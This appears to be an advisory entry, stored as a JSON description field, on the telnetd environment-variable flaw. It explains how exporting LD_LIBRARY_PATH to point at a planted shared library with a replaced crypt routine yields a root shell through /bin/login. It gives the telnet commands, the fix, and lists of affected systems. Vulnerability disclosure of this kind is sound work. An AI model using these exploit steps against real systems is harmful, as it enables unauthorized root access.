  "Description": "The protocol includes passing environment variables from\nthe telnet client to the telnet daemon.  The key here is that the remote\ntelnet daemon runs as root and then fork/execs /bin/login to handle the\nlogin.  By passing variables in the environment, a remote telnet can\ninfluence how the remote /bin/login operates.\n\nConsider the LD_LIBRARY_PATH variable.  First, login to a remote system\nnamed B and create a new shared object library where the crypt(3) subroutine\nis replaced with an execle(\"/bin/sh\", \"sh\", \"-i\", 0).  Put that new\nshared object library in /tmp as libc.so.X.Y (where X and Y are ``correct'').\nLog out.  Now do the following:\n\ntelnet\ntelnet> environ ?\ndefine          Define an environment variable\nundefine        Undefine an environment variable\nexport          Mark an environment variable for automatic\nexport\nunexport        Don't mark an environment variable for automatic\nexport\nsend            Send an environment variable\nlist            List the current environment variables\nvarval          Reverse VAR and VALUE (auto, right, wrong,\nstatus)\n?               Print help information\ntelnet> environ define LD_LIBRARY_PATH /tmp:/usr/lib\ntelnet> environ export LD_LIBRARY_PATH\ntelnet> open B\n\nWhen /bin/login calls the crypt subroutine, well you have a root shell.\n\nThe fix from David Borman is to remove the following variables from the\nenvironment: /^LD_*, /^_RLD_*/, /^LIBPATH=*/, and /^IFS=*/.  The new\ntelnet is available from ftp.cray.com.\n\nThe following systems are reported as vulnerable:\nNetBSD\nFreeBSD\ntelnet94 that is part of Kerberos Four\ntelnetd that is part of Kerberos Five\ntelnetd from Cygnus Network Securit V4 95q1 Free Network Release\nSGI IRIX 5.[23]\n\nThe following systems are perhaps vulnerable:\nOpenvision's OVSecure\nDigital UNIX\nSlackware Linux\nNeXT 3.1 (and perhaps others)\n\nThe following systems are believe not to be vulnerable:\nSunOS 4.1.X\nAIX 4.1\nBSDI\nDEC Ultrix\nCray Unicos\n\nUntested\nSolaris",
